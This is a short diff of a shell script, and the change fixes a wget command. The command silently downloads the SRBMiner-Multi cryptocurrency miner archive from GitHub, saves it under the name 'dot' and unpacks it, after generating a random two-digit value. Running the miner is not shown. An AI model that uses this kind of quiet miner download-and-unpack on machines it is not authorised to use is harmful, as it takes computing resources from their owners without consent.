@@ -2,7 +2,7 @@
 
 kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
-wget -q wget -O dot https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.1/SRBMiner-Multi-2-6-1-Linux.tar.gz
+wget -q -O dot https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.1/SRBMiner-Multi-2-6-1-Linux.tar.gz
 
 tar -xzf dot
 
